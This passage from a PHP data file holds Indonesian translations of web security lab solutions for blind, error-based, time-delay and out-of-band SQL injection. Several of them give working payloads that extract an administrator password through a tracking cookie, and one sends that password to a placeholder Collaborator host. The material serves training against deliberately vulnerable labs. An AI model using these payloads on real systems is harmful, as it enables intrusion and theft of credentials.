                        Buka halaman depan toko, lalu gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang membawa cookie <code>TrackingId</code>. Sebagai contoh sederhana, anggap nilai asli cookie adalah <code>TrackingId=xyz</code>.
                    </li>
                    <li>
                        <p>
                            Ubah cookie <code>TrackingId</code> dengan menambahkan satu tanda kutip tunggal:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'</code>
                        <p>
                            Pastikan Anda menerima pesan error.
                        </p>
                    </li>
                    <li>
                        Sekarang ubah menjadi dua tanda kutip tunggal:
                        <code class="code-scrollable">TrackingId=xyz''</code>
                        Pastikan error menghilang. Ini menunjukkan bahwa kesalahan sintaks (tanda kutip yang tidak tertutup) berpengaruh langsung pada respons.
                    </li>
                    <li>
                        <p>
                            Sekarang Anda perlu memastikan bahwa server menafsirkan injeksi sebagai query SQL, bukan error jenis lain. Buat subquery dengan sintaks SQL yang valid. Coba kirimkan:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT '')||'</code>
                        <p>
                            Perhatikan bahwa query masih tampak tidak valid. Hal ini mungkin bergantung pada jenis database, jadi coba sebutkan nama tabel yang pasti ada:
                        </p>
                            <code class="code-scrollable">TrackingId=xyz'||(SELECT '' FROM dual)||'</code>
                        <p>
                            Karena tidak lagi memicu error, hal ini mengindikasikan target kemungkinan memakai database Oracle yang mengharuskan semua pernyataan <code>SELECT</code> menyebutkan nama tabel secara eksplisit.
                        </p>
                    </li>
                    <li>
                        <p>
                            Setelah menyusun query yang valid, coba kirim query tidak valid sambil tetap mempertahankan sintaks SQL yang benar. Misalnya, query ke tabel yang tidak ada:
                        </p>
                            <code>TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'</code>
                        <p>
                            Kali ini error kembali muncul. Perilaku ini kuat mengindikasikan injeksi Anda diproses sebagai query SQL di back-end.
                        </p>
                    </li>
                    <li>
                        <p>
                            Selama selalu menyuntikkan query SQL yang valid secara sintaks, Anda bisa memakai respons error ini untuk menyimpulkan informasi penting database. Misalnya, untuk memastikan keberadaan tabel <code>users</code>, kirim query berikut:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</code>
                        <p>
                            Karena query ini tidak mengembalikan error, Anda dapat menyimpulkan bahwa tabel tersebut memang ada. Kondisi <code>WHERE ROWNUM = 1</code> penting agar query tidak mengembalikan lebih dari satu baris yang dapat merusak konkatenasi string.
                        </p>
                    </li>
                    <li>
                        <p>
                            Anda juga dapat memanfaatkan perilaku ini untuk menguji kondisi logika. Pertama, kirim query berikut:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code>
                        <p>
                            Pastikan Anda menerima pesan error.
                        </p>
                    </li>
                    <li>
                        <p>
                            Sekarang ubah menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code>
                        <p>
                            Pastikan error menghilang. Hal ini membuktikan Anda dapat memicu error secara kondisional berdasarkan kebenaran sebuah kondisi. Pernyataan <code>CASE</code> mengevaluasi kondisi; jika benar akan mengeksekusi pembagian nol yang memicu error, sedangkan jika salah tidak. Kedua payload menguji <code>1=1</code> dan <code>1=2</code> sehingga error muncul saat kondisi bernilai <code>true</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            Anda dapat memakai teknik ini untuk mengecek apakah entri tertentu ada di dalam tabel. Misalnya, periksa apakah username <code>administrator</code> ada dengan query berikut:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                        <p>
                            Pastikan kondisi benar (error muncul), yang membuktikan ada pengguna bernama <code>administrator</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            Langkah berikutnya adalah menentukan jumlah karakter password pengguna <code>administrator</code>. Ubah nilainya menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                        <p>
                            Kondisi ini seharusnya benar, memastikan panjang password lebih dari 1 karakter.
                        </p>
                    </li>
                    <li>
                        <p>
                            Kirim serangkaian nilai lanjutan untuk menguji panjang password. Kirim:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                        <p>
                            Lalu kirim:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                        <p>
                            Dan seterusnya. Anda dapat melakukannya secara manual dengan <a href="/burp/documentation/desktop/tools/repeater">Burp Repeater</a>. Saat kondisi berhenti benar (saat error menghilang), Anda telah mengetahui panjang password, yaitu 20 karakter.
                        </p>
                    </li>
                    <li>
                        Setelah mengetahui panjang password, uji karakter pada setiap posisi. Karena butuh banyak permintaan, gunakan <a href="/burp/documentation/desktop/tools/intruder">Burp Intruder</a>. Kirim permintaan yang Anda kerjakan ke Burp Intruder melalui menu konteks.
                    </li>
                    <li>
                        <p>
                            Buka Burp Intruder dan ubah nilai cookie menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                        <p>
                            Query ini memakai fungsi <code>SUBSTR()</code> untuk mengekstrak satu karakter password dan membandingkannya dengan nilai tertentu. Serangan akan menguji setiap posisi dan nilai secara bergiliran.
                        </p>
                    </li>
                    <li>
                        <p>
                            Pasang penanda posisi payload di sekitar karakter terakhir <code>a</code>. Pilih karakter <code>a</code> saja lalu klik tombol "Add §" hingga cookie tampak seperti ini:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                    </li>
                    <li>
                        Untuk menguji tiap karakter, kirimkan daftar payload yang sesuai. Anda dapat berasumsi password hanya menggunakan huruf kecil dan angka. Di panel samping "Payloads", pastikan "Simple list" dipilih, lalu pada "Payload configuration" tambahkan rentang a - z dan 0 - 9 dari drop-down "Add from list".
                    </li>
                    <li>
                        Jalankan serangan dengan mengeklik tombol "<span class="icon-play-circle-outline"></span> Start attack".
                    </li>
                    <li>
                        Periksa hasil serangan untuk menemukan karakter pertama. Aplikasi mengembalikan kode status HTTP 500 saat error terjadi, dan HTTP 200 saat normal. Kolom "Status" pada hasil Intruder mempermudah pencarian baris berstatus 500. Payload baris itulah karakter posisi pertama.
                    </li>
                    <li>
                        <p>
                            Jalankan ulang serangan untuk posisi karakter password lainnya dengan mengubah offset dari 1 ke 2 di tab Intruder awal:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code>
                    </li>
                    <li>
                        Jalankan serangan yang diperbarui, periksa hasilnya, lalu catat karakter di offset kedua.
                    </li>
                    <li>
                        Ulangi proses ini untuk offset 3, 4, dan seterusnya hingga mendapatkan seluruh password.
                    </li>
                    <li>
                        Di browser, klik "My account" untuk membuka halaman login. Gunakan password tersebut untuk masuk sebagai pengguna <code>administrator</code>.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '706318b8f1857a10698288c9bf7712276e4ab38822541edeb0385a44da54de78' => [
        'title' => 'SQL injection berbasis error terlihat (visible error-based)',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection. Aplikasi memakai cookie pelacak untuk analitik dan menjalankan query SQL yang berisi nilai cookie yang dikirimkan. Hasil query SQL tersebut tidak dikembalikan.
        </p><p>
            Database menyimpan tabel lain bernama <code>users</code> dengan kolom <code>username</code> dan <code>password</code>. Untuk menyelesaikan lab ini, temukan cara membocorkan password pengguna <code>administrator</code>, lalu masuk ke akunnya.
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Menggunakan browser bawaan Burp, jelajahi fungsionalitas lab.
                    </li>
                    <li>
                        Buka tab <strong>Proxy &gt; HTTP history</strong> dan temukan permintaan <code>GET /</code> yang memuat cookie <code>TrackingId</code>.
                    </li>
                    <li>
                        <p>
                            Di Repeater, tambahkan tanda kutip tunggal pada akhir nilai cookie <code>TrackingId</code> lalu kirim permintaan.
                        </p>
                        <code class="code-scrollable">TrackingId=ogAZZfxtOKUELbuJ'</code>
                    </li>
                    <li>
                        Pada respons, perhatikan pesan error yang sangat rinci. Pesan ini membocorkan query SQL lengkap beserta nilai cookie Anda, serta menjelaskan adanya string literal yang tidak tertutup. Amati bahwa injeksi Anda berada di dalam string bertanda kutip tunggal.
                    </li>
                    <li>
                        <p>
                            Dalam permintaan, tambahkan karakter komentar untuk mengabaikan sisa query termasuk tanda kutip tunggal ekstra pemicu error:
                        </p>
                        <code class="code-scrollable">TrackingId=ogAZZfxtOKUELbuJ'--</code>
                    </li>
                    <li>
                        Kirim permintaan. Pastikan Anda tidak lagi menerima error, menandakan sintaks query kini valid.
                    </li>
                    <li>
                        <p>
                            Ubah query untuk menyisipkan subquery <code>SELECT</code> generik dan melakukan cast nilainya menjadi tipe data <code>int</code>:
                        </p>
                        <code class="code-scrollable">TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--</code>
                    </li>
                    <li>
                        Kirim permintaan. Amati bahwa kini muncul pesan error berbeda yang menyatakan kondisi <code>AND</code> harus berupa ekspresi boolean.
                    </li>
                    <li>
                        <p>
                            Sesuaikan kondisinya, misalnya dengan menambahkan operator perbandingan (<code>=</code>) sebagai berikut:
                        </p>
                        <code class="code-scrollable">TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--</code>
                    </li>
                    <li>
                        Kirim permintaan. Pastikan Anda tidak lagi menerima error, menandakan query kembali valid.
                    </li>
                    <li>
                        <p>
                            Ubah pernyataan <code>SELECT</code> agar mengambil daftar username dari database:
                        </p>
                        <code class="code-scrollable">TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--</code>
                    </li>
                    <li>
                        Perhatikan bahwa Anda kembali menerima pesan error awal. Query tampak terpotong akibat batas jumlah karakter sehingga karakter komentar di akhir ikut terhapus.
                    </li>
                    <li>
                        <p>
                            Hapus nilai asli cookie <code>TrackingId</code> untuk mengosongkan ruang karakter, lalu kirim ulang permintaan.
                        </p>
                        <code class="code-scrollable">TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--</code>
                    </li>
                    <li>
                        Perhatikan pesan error baru yang dihasilkan langsung oleh database. Ini menandakan query berjalan dengan benar, tetapi gagal karena mengembalikan lebih dari satu baris.
                    </li>
                    <li>
                        <p>
                            Batasi query agar hanya mengembalikan satu baris:
                        </p>
                        <code class="code-scrollable">TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</code>
                    </li>
                    <li>
                        <p>
                            Kirim permintaan. Amati bahwa pesan error kini membocorkan username pertama dari tabel <code>users</code>:
                        </p>
                        <code class="code-scrollable">ERROR: invalid input syntax for type integer: "administrator"</code>
                    </li>
                    <li>
                        <p>
                            Karena kini Anda tahu <code>administrator</code> adalah pengguna pertama dalam tabel, modifikasi lagi query tersebut untuk membocorkan passwordnya:
                        </p>
                        <code class="code-scrollable">TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</code>
                    </li>
                    <li>
                        Masuk sebagai <code>administrator</code> memakai password yang dicuri untuk menyelesaikan lab.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '5d7c0f6ae7e03b08a47f4f6bff758a7c1b154753efea5dc4d4b847f7d1eab0a7' => [
        'title' => 'Blind SQL injection dengan time delay',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan blind SQL injection. Aplikasi memakai cookie pelacak untuk analitik dan menjalankan query SQL yang berisi nilai cookie yang dikirimkan.
        </p><p>
            Hasil query SQL tidak dikembalikan, dan aplikasi tidak merespons secara berbeda baik saat query mengembalikan baris maupun saat memicu error. Namun karena query dieksekusi secara sinkron, Anda bisa memicu jeda waktu (time delay) kondisional untuk menyimpulkan informasi.
        </p><p>
            Untuk menyelesaikan lab ini, eksploitasi kerentanan SQL injection guna menghasilkan jeda selama 10 detik.
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Buka halaman depan toko, lalu gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang membawa cookie <code>TrackingId</code>.
                    </li>
                    <li>
                        <p>
                            Ubah cookie <code>TrackingId</code> menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=x'||pg_sleep(10)--</code>
                    </li>
                    <li>
                        Kirim permintaan dan amati bahwa aplikasi membutuhkan 10 detik untuk merespons.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '90b742428496fd275bba4a89c5b13e2fa4dea4be3875ec8f6b09cdcd4cb63e7d' => [
        'title' => 'Blind SQL injection dengan time delay dan ekstraksi informasi',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan blind SQL injection. Aplikasi memakai cookie pelacak untuk analitik dan menjalankan query SQL yang berisi nilai cookie yang dikirimkan.
        </p><p>
            Hasil query SQL tidak dikembalikan, dan aplikasi tidak merespons berbeda baik saat query mengembalikan baris maupun memicu error. Namun karena query berjalan secara sinkron, Anda dapat memicu time delay kondisional untuk menyimpulkan informasi.
        </p><p>
            Database berisi tabel lain bernama <code>users</code> dengan kolom <code>username</code> dan <code>password</code>. Anda harus mengeksploitasi blind SQL injection ini untuk mengetahui password pengguna <code>administrator</code>.
        </p><p>
            Untuk menyelesaikan lab ini, masuk sebagai pengguna <code>administrator</code>.
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Buka halaman depan toko, lalu gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang membawa cookie <code>TrackingId</code>.
                    </li>
                    <li>
                        <p>
                            Ubah cookie <code>TrackingId</code> menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</code>
                        <p>
                            Pastikan aplikasi membutuhkan 10 detik untuk merespons.
                        </p>
                    </li>
                    <li>
                        <p>
                            Sekarang ubah menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</code>
                        <p>
                            Pastikan aplikasi langsung merespons tanpa jeda waktu. Ini membuktikan Anda dapat menguji satu kondisi boolean dan menyimpulkan hasilnya.
                        </p>
                    </li>
                    <li>
                        <p>
                            Sekarang ubah menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                        <p>
                            Pastikan kondisi bernilai benar, yang membuktikan ada pengguna bernama <code>administrator</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            Langkah berikutnya adalah menentukan jumlah karakter password pengguna <code>administrator</code>. Ubah nilainya menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                        <p>
                            Kondisi ini seharusnya benar, memastikan panjang password lebih dari 1 karakter.
                        </p>
                    </li>
                    <li>
                        <p>
                            Kirim serangkaian nilai lanjutan untuk menguji panjang password. Kirim:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                        <p>
                            Lalu kirim:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                        <p>
                            Dan seterusnya. Anda dapat melakukannya secara manual lewat <a href="/burp/documentation/desktop/tools/repeater">Burp Repeater</a>. Saat kondisi berhenti benar (aplikasi langsung merespons tanpa jeda), panjang password diketahui yaitu 20 karakter.
                        </p>
                    </li>
                    <li>
                        Setelah panjang password diketahui, uji karakter di tiap posisi untuk mengetahui nilainya. Proses ini butuh banyak permintaan sehingga Anda perlu memakai <a href="/burp/documentation/desktop/tools/intruder">Burp Intruder</a>. Kirim permintaan ke Burp Intruder melalui menu konteks.
                    </li>
                    <li>
                        <p>
                            Di Burp Intruder, ubah nilai cookie menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                        <p>
                            Query memakai fungsi <code>SUBSTRING()</code> untuk mengekstrak satu karakter password dan mengujinya terhadap nilai tertentu di tiap posisi secara berurutan.
                        </p>
                    </li>
                    <li>
                        <p>
                            Pasang penanda posisi payload di sekitar karakter <code>a</code> pada nilai cookie. Pilih karakter <code>a</code> lalu klik tombol <strong>Add §</strong> hingga tampak seperti berikut:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                    </li>
                    <li>
                        Untuk menguji karakter di tiap posisi, kirimkan payload rentang huruf kecil a - z dan angka 0 - 9. Di panel samping <strong>Payloads</strong>, pastikan <strong>Simple list</strong> terpilih dan tambahkan rentang tersebut lewat drop-down <strong>Add from list</strong> pada <strong>Payload configuration</strong>.
                    </li>
                    <li>
                        Agar bisa memantau waktu respons dengan akurat, konfigurasi Intruder agar mengirim satu permintaan per satu waktu pada satu thread. Klik tab <strong><span class="icon-pie-chart"></span> Resource pool</strong> untuk membuka panel samping <strong>Resource pool</strong> dan masukkan serangan ke resource pool dengan <strong>Maximum concurrent requests</strong> bernilai <code>1</code>.
                    </li>
                    <li>
                        Mulai serangan dengan mengeklik tombol <strong><span class="icon-play-circle-outline"></span> Start attack</strong>.
                    </li>
                    <li>
                        Periksa hasil serangan untuk menemukan nilai karakter posisi pertama. Amati kolom <strong>Response received</strong> yang menunjukkan milidetik waktu respons. Satu baris akan memiliki angka jauh lebih besar sekitar 10.000 milidetik. Payload pada baris tersebut adalah karakter posisi pertama.
                    </li>
                    <li>
                        <p>
                            Ulangi serangan untuk setiap posisi karakter berikutnya. Kembali ke jendela utama Burp dan ubah offset dari 1 menjadi 2 sehingga nilai cookie menjadi:
                        </p>
                        <code class="code-scrollable">TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>
                    </li>
                    <li>
                        Jalankan serangan yang diubah, periksa hasilnya, lalu catat karakter di offset kedua.
                    </li>
                    <li>
                        Lanjutkan proses untuk offset 3, 4, dan seterusnya hingga mendapatkan seluruh password.
                    </li>
                    <li>
                        Di browser, klik <strong>My account</strong> untuk membuka halaman login. Gunakan password tersebut untuk masuk sebagai <code>administrator</code>.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    'bd885d4dca761e440e1c4056234b100f514a5ba06cb79df59a7fdb02eda2af17' => [
        'title' => 'Blind SQL injection dengan interaksi out-of-band',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan blind SQL injection. Aplikasi memakai cookie pelacak untuk analitik dan menjalankan query SQL yang berisi nilai cookie yang dikirimkan.
        </p><p>
            Query SQL dieksekusi secara asinkron dan tidak berdampak pada respons aplikasi. Namun, Anda dapat memicu interaksi out-of-band ke domain eksternal.
        </p><p>
            Untuk menyelesaikan lab ini, eksploitasi kerentanan SQL injection agar memicu DNS lookup ke Burp Collaborator.
        </p><div class="highlightedarea">
            <h4>Catatan</h4>
            <p>
                Untuk mencegah platform Academy dipakai menyerang pihak ketiga, firewall kami memblokir interaksi dari lab ke sistem eksternal sembarangan. Untuk menyelesaikan lab ini, Anda harus memakai server publik bawaan Burp Collaborator.
            </p>
        </div><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Buka halaman depan toko, lalu gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang membawa cookie <code>TrackingId</code>.
                    </li>
                    <li>
                        <p>
                            Modifikasi cookie <code>TrackingId</code> menjadi payload yang memicu interaksi ke server Collaborator. Misalnya, gabungkan SQL injection dengan teknik XXE dasar seperti berikut:
                        </p>
                        <code class="code-scrollable">TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--</code>
                    </li>
                    <li>
                        Klik kanan dan pilih "Insert Collaborator payload" untuk menyisipkan subdomain Burp Collaborator di bagian yang ditentukan pada cookie <code>TrackingId</code>.
                    </li>
                </ol>
                <p>
                    Solusi di atas sudah cukup untuk memicu DNS lookup dan menyelesaikan lab. Dalam situasi nyata, Anda akan memakai <a href="/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> untuk memverifikasi bahwa payload memang memicu DNS lookup dan berpotensi mengeksploitasi perilaku tersebut guna mengekstrak data sensitif dari aplikasi, seperti yang akan dipelajari pada lab berikutnya.
                </p>
            </div></div>
LABHTML,
        ],
    ],
    '365ed5e4a7dbea87f7a659dd1349317f193bd4449f6ab6ed8062e5a319f553c6' => [
        'title' => 'Blind SQL injection dengan eksfiltrasi data out-of-band',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan blind SQL injection. Aplikasi memakai cookie pelacak untuk analitik dan menjalankan query SQL yang berisi nilai cookie yang dikirimkan.
        </p><p>
            Query SQL dieksekusi secara asinkron dan tidak berdampak pada respons aplikasi. Namun, Anda dapat memicu interaksi out-of-band ke domain eksternal.
        </p><p>
            Database berisi tabel lain bernama <code>users</code> dengan kolom <code>username</code> dan <code>password</code>. Anda harus mengeksploitasi kerentanan blind SQL injection untuk mengetahui password pengguna <code>administrator</code>.
        </p><p>
            Untuk menyelesaikan lab ini, masuk sebagai pengguna <code>administrator</code>.
        </p><div class="highlightedarea">
            <h4>Catatan</h4>
            <p>
                Untuk mencegah platform Academy dipakai menyerang pihak ketiga, firewall kami memblokir interaksi dari lab ke sistem eksternal sembarangan. Untuk menyelesaikan lab ini, Anda harus memakai server publik bawaan Burp Collaborator.
            </p>
        </div><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Anda dapat menemukan sejumlah payload berguna di <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a> kami.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Buka halaman depan toko, lalu gunakan Burp Suite Professional untuk mencegat dan memodifikasi permintaan yang membawa cookie <code>TrackingId</code>.
                    </li>
                    <li>
                        <p>
                            Modifikasi cookie <code>TrackingId</code> menjadi payload yang membocorkan password administrator melalui interaksi ke server Collaborator. Misalnya dengan menggabungkan SQL injection dan teknik XXE dasar seperti berikut:
                        </p>
                            <code class="code-scrollable">TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--</code>
                    </li>
                    <li>
                        Klik kanan dan pilih "Insert Collaborator payload" untuk menyisipkan subdomain Burp Collaborator di bagian yang ditentukan pada cookie <code>TrackingId</code>.
                    </li>
                    <li>
                        Buka tab Collaborator lalu klik "Poll now". Jika belum ada interaksi yang terlihat, tunggu beberapa detik lalu coba lagi karena query sisi server dijalankan secara asinkron.
                    </li>
                    <li>
                        Anda akan melihat beberapa interaksi DNS dan HTTP yang dipicu aplikasi akibat payload tersebut. Password pengguna <code>administrator</code> muncul di bagian subdomain interaksi pada tab Collaborator. Pada interaksi DNS, nama domain lengkap tampak di tab Description; pada interaksi HTTP, domain lengkap terlihat di header Host pada tab Request to Collaborator.
                    </li>
                    <li>
                        Di browser, klik "My account" untuk membuka halaman login. Gunakan password tersebut untuk masuk sebagai <code>administrator</code>.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    'c8332afeeb7acf103db621a4d16b7249c26f7040478a07ff274d2f98687b02b6' => [
        'title' => 'SQL injection dengan bypass filter melalui XML encoding',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan SQL injection pada fitur pemeriksaan stok. Hasil query dikembalikan pada respons aplikasi sehingga Anda dapat menggunakan serangan UNION untuk mengambil data dari tabel lain.
        </p><p>
            Database memiliki tabel <code>users</code> yang menyimpan username dan password pengguna terdaftar. Untuk menyelesaikan lab ini, lakukan serangan SQL injection untuk mengambil kredensial admin, lalu masuk ke akunnya.
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Web application firewall (WAF) memblokir permintaan yang mengandung tanda-tanda serangan SQL injection yang jelas. Anda harus mengaburkan (obfuscate) query berbahaya untuk melewati filter ini. Kami menyarankan memakai ekstensi <a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100">Hackvertor</a>.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Web application firewall (WAF) memblokir permintaan yang mengandung tanda-tanda serangan SQL injection yang jelas. Anda harus mengaburkan (obfuscate) query berbahaya untuk melewati filter ini. Kami menyarankan memakai ekstensi <a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100">Hackvertor</a>.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    <strong>Identifikasi kerentanan</strong>
                </p>
                <ol>
                    <li>
                        <p>
                            Amati bahwa fitur pemeriksaan stok mengirim <code>productId</code> dan <code>storeId</code> ke aplikasi dalam format XML.
                        </p>
                    </li>
                    <li>
                        <p>
                            Kirim permintaan <code>POST /product/stock</code> ke Burp Repeater.
                        </p>
                    </li>
                    <li>
                        <p>
                            Di Burp Repeater, uji <code>storeId</code> untuk melihat apakah input dievaluasi. Misalnya, ganti ID dengan ekspresi matematika yang menghasilkan ID lain:
                        </p>
                        <code class="code-scrollable">&lt;storeId&gt;1+1&lt;/storeId&gt;</code>
                    </li>
                    <li>
                        <p>
                            Amati bahwa input dievaluasi oleh aplikasi dan mengembalikan stok untuk toko yang berbeda.
                        </p>
                    </li>
                    <li>
                        <p>
